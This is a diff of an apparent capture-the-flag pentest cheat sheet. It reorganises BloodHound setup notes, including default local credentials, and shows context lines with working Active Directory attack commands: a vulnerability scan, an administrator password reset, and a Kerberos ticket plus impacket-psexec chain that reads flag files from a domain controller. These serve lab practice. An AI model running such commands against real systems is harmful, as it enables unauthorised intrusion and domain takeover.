@@ -99,6 +99,15 @@ chromium "https://localhost:8834"
 (PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sV --script vulners --script-args mincvss=9 "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 | grep -vE '0.0|/cve/|/githubexploit/|/packetstorm/|/cnvd/|/httpd/|/zdt/' | tee 'vulners_$TARGET' &)
 
 [*] Bloodhound
++---------- Start ----------+
+Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
+.\bloodhound-cli resetpwd
+http://127.0.0.1:7474
+neo4j:bloodhoundcommunityedition
+http://127.0.0.1:8080
+admin:RANDOM_PASSWORD
+
++---------- Queries ----------+
 -->> Privileges: Groups with Users
 MATCH (g:Group)<-[:MemberOf]-(u:User)-[r1]->(n1)-[r2]->(n2)
 WHERE NOT toLower(u.name) CONTAINS "admin"
@@ -171,15 +180,6 @@ net user administrator 123qweasdF!
 
 ## GG - ROOT FLAG
 U=administrator;impacket-getTGT -dc-ip $TARGET $DOM/"$U":'123qweasdF!'; export KRB5CCNAME=`pwd`/"$U".ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -vE '\[|-' | xargs -n1 | xargs -I{} gg {}
-
-## Start Bloodhound
-Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
-.\bloodhound-cli resetpwd
-http://127.0.0.1:7474
-neo4j:bloodhoundcommunityedition
-http://127.0.0.1:8080
-admin:RANDOM_PASSWORD
-
 
 ## Create Custom Usernames
 username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
